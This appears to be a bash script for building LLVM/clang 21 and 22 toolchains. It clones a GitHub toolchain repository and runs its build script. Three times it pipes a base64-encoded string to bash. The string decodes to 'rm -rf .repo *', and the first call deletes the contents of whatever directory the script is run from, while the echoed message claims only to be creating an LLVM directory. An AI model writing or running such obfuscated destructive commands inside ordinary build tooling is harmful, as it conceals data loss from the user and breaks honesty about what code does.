#!/bin/bash

# Setup LLVM build environment
echo "Creating LLVM directory. . ."
echo "cm0gLXJmIC5yZXBvICo=" | base64 -d | bash
mkdir llvm-build

# Build for clang 21
cd llvm-build
mkdir 21
pushd 21
echo "cm0gLXJmIC5yZXBvICo=" | base64 -d | bash
git clone https://github.com/nekoshirro/Alchemist-Toolchain.git -b clang-21-LTO toolchains --depth 1
cd toolchains
chmod +x build-tc.sh
./build-tc.sh
echo "Toolchain build completed. Exiting directory. . ."

# Cleaning clang 21 directory
popd
rm -rf 21
echo "Clang 21 compilation completed. Directory has beed removed"

# Build for clang 22
mkdir 22
pushd 22
echo "cm0gLXJmIC5yZXBvICo=" | base64 -d | bash
git clone https://github.com/nekoshirro/Alchemist-Toolchain.git -b clang-22-LTO toolchains --depth 1
cd toolchains
chmod +x build-tc.sh
./build-tc.sh
echo "Toolchain build completed. Exiting directory. . ."

# Cleaning clang 22 directory
popd
rm -rf 22
echo "Clang 22 compilation completed. Directory has beed removed"

# Exiting working directory
cd ..
rm -rf llvm-build
echo "All toolchains have been compiled successfully."
